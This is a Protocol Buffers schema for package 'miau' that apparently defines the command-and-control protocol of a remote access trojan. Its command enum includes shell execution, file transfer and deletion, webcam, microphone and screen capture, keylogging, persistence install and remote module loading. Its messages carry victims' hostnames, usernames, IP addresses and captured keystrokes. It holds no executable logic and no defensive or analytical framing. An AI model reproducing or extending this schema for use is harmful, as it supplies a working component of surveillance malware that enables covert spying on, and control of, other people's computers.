syntax = "proto3";

package miau;

enum PacketType {
    PACKET_UNKNOWN   = 0;
    PACKET_AUTH      = 1;
    PACKET_AUTH_ACK  = 2;
    PACKET_HEARTBEAT = 3;
    PACKET_COMMAND   = 4;
    PACKET_RESPONSE  = 5;
    PACKET_FILE_CHUNK= 6;
    PACKET_SCREEN    = 7;
    PACKET_KEYLOG    = 8;
    PACKET_MODULE    = 9;
    PACKET_EVENT     = 10;
}

enum ClientState {
    STATE_UNKNOWN  = 0;
    STATE_ONLINE   = 1;
    STATE_OFFLINE  = 2;
    STATE_IDLE     = 3;
    STATE_BUSY     = 4;
}

enum CommandType {
    CMD_NONE           = 0;
    CMD_SHELL_EXEC     = 1;
    CMD_FILE_LIST      = 2;
    CMD_FILE_DOWNLOAD  = 3;
    CMD_FILE_UPLOAD    = 4;
    CMD_FILE_DELETE    = 5;
    CMD_PROCESS_LIST   = 6;
    CMD_PROCESS_KILL   = 7;
    CMD_NET_LIST       = 8;
    CMD_SCREEN_START   = 9;
    CMD_SCREEN_STOP    = 10;
    CMD_WEBCAM_START   = 11;
    CMD_WEBCAM_STOP    = 12;
    CMD_MIC_START      = 13;
    CMD_MIC_STOP       = 14;
    CMD_KEYLOG_START   = 15;
    CMD_KEYLOG_STOP    = 16;
    CMD_PERSIST_INSTALL= 17;
    CMD_PERSIST_REMOVE = 18;
    CMD_MODULE_LOAD    = 19;
    CMD_MODULE_EXEC    = 20;
    CMD_MODULE_RESTART = 21;
    CMD_UNINSTALL      = 22;
    CMD_PING           = 23;
    CMD_SYSINFO        = 24;
}

enum ResponseStatus {
    RESP_OK     = 0;
    RESP_ERROR  = 1;
    RESP_PENDING= 2;
    RESP_PARTIAL= 3;
}

message Envelope {
    uint32           version     = 1;
    string           token       = 2;
    uint64           seq         = 3;
    uint64           timestamp   = 4;
    PacketType       packet_type = 5;
    bytes            nonce       = 6;
    bytes            payload     = 7;
}

message ClientAuth {
    string           token       = 1;
    string           hostname    = 2;
    string           username    = 3;
    string           os          = 4;
    string           arch        = 5;
    string           client_ver  = 6;
    string           install_id  = 7;
}

message AuthAck {
    bool             accepted    = 1;
    string           reason      = 2;
    uint32           hb_interval = 3;
}

message Heartbeat {
    uint32           cpu       = 1;
    uint32           ram_used  = 2;
    uint32           ram_total = 3;
    string           pub_ip    = 4;
    string           priv_ip   = 5;
    uint64           uptime    = 6;
}

message Command {
    uint64           id        = 1;
    CommandType      cmd_type  = 2;
    string           args      = 3;
    bytes            blob      = 4;
    uint32           timeout   = 5;
}

message Response {
    uint64           id        = 1;
    ResponseStatus   status    = 2;
    string           message   = 3;
    bytes            data      = 4;
    bool             final     = 5;
}

message FileEntry {
    string           path      = 1;
    uint64           size      = 2;
    bool             is_dir    = 3;
    int64            modified  = 4;
}

message FileList {
    string           base      = 1;
    repeated FileEntry entries = 2;
}

message FileChunk {
    string           path      = 1;
    uint64           offset    = 2;
    bytes            data      = 3;
    bool             last      = 4;
}

message ScreenFrame {
    uint32           width     = 1;
    uint32           height    = 2;
    bytes            jpeg      = 3;
    uint32           fps       = 4;
}

message KeyLog {
    string           window    = 1;
    string           text      = 2;
    int64            ts        = 3;
}

message ProcessEntry {
    uint32           pid       = 1;
    string           name      = 2;
    string           path      = 3;
    uint32           cpu       = 4;
    uint64           mem       = 5;
}

message ProcessList {
    repeated ProcessEntry entries = 1;
}

message NetEntry {
    string           proto     = 1;
    string           local     = 2;
    string           remote    = 3;
    string           state     = 4;
    uint32           pid       = 5;
}

message NetList {
    repeated NetEntry entries = 1;
}

message ModuleHeader {
    string           name      = 1;
    string           version   = 2;
    bytes            binary    = 3;
    string           entry     = 4;
}

message SysInfo {
    string           hostname  = 1;
    string           os        = 2;
    string           arch      = 3;
    string           cpu_name  = 4;
    uint32           cpu_cores = 5;
    uint64           ram_total = 6;
    string           gpu       = 7;
    string           pub_ip    = 8;
    string           priv_ip   = 9;
    string           timezone  = 10;
    uint64           uptime    = 11;
}

message ClientEvent {
    string           kind      = 1;
    string           detail    = 2;
    int64            ts        = 3;
}
